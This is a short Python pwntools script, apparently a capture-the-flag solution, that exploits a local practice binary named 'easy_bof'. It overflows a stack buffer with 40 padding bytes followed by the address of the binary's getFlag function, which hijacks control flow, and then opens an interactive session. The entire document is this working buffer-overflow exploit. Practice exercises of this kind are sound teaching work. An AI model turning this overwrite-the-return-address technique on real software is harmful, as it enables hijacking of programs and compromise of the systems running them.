import pwn

p = pwn.process("./easy_bof")
elf = pwn.ELF("./easy_bof")
addr = elf.symbols["getFlag"]
p.sendline(b"A" * 40 + pwn.p64(addr))
p.interactive()